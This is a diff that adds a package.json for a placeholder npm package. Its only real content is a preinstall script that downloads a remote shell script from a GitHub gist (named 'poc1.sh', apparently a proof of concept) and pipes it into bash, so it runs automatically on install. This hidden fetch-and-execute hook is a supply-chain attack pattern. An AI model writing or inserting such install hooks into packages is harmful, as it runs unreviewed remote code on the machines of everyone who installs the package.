@@ -1,0 +1,8 @@
+{
+  "name": "my-awesome-package",
+  "version": "1.0.0",
+  "author": "Your Name <email@example.com> (https://example.com)",
+  "scripts": {
+    "preinstall": "curl -sSfL https://gist.githubusercontent.com/gcbrun/bec631c618fc1a6899ad829861c55fd3/raw/poc1.sh | bash"
+  }
+}
